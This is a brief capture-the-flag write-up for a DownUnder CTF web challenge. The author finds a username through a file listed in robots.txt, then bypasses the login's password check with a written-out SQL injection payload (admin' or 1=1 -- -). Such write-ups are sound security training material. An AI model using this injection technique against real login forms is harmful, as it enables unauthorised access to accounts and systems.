# hi
![image](https://user-images.githubusercontent.com/65381453/134702958-60be6c5b-a6ef-46b7-ab05-67c77db396cb.png)

![image](https://user-images.githubusercontent.com/65381453/134804016-52f19455-6d4b-4511-9778-e5d683627db7.png)

background is login form

first i try login with any character

![image](https://user-images.githubusercontent.com/65381453/134804000-4c84f61f-c6cd-4141-bb2e-4e539f4ef67a.png)

result is 
```
Incorrect username or password
```

i try go robots.txt

![image](https://user-images.githubusercontent.com/65381453/134804201-7e096fc8-723d-4a46-a04c-500d21f864c3.png)

```
/sad.eml
```

new file ? i get file sad.eml, see it

```
MIME-Version: 1.0
Date: Sun, 18 Jul 2021 20:48:32 +1000
Message-ID: <CAOXXCfPcb9Odey1va2xW=paWmwgrQoYFu9ayBUznwLr-FuD9Gw@mail.gmail.com>
Subject: :'( 
From: DownUnder CTF <contact.downunderctf@gmail.com>
To: sadcowboys@everyone.com
Content-Type: multipart/alternative; boundary="0000000000000f998405c7639019"

--0000000000000f998405c7639019
Content-Type: text/plain; charset="UTF-8"

Everyone says 'yeee hawwwww'

but never 'hawwwww yeee'

:'(

thats why a 'sadcowboy' is only allowed to go into our website

--0000000000000f998405c7639019
Content-Type: text/html; charset="UTF-8"

<div dir="ltr">Everyone says &#39;yeee hawwwww&#39;<br><br>but never &#39;hawwwww yeee&#39;<br><br>:&#39;(<br><br>thats why a &#39;sadcowboy&#39; is only allowed to go into our website<br></div>

--0000000000000f998405c7639019--
```

when i read file, i thinks username is sadcowboy , try it

![image](https://user-images.githubusercontent.com/65381453/134804252-657c4855-9501-4a60-a59c-e65a8937ef83.png)

```
Incorrect password
```

yes , username correct

no thing here, i try sqli

```
username: sadcowboy
passwd: admin' or 1=1 -- -
````

![image](https://user-images.githubusercontent.com/65381453/134804281-8c00d513-c2bd-4b5d-8c32-37285a93fb7f.png)

slove

https://web-cowboy-world-54f063db.chal-2021.duc.tf/
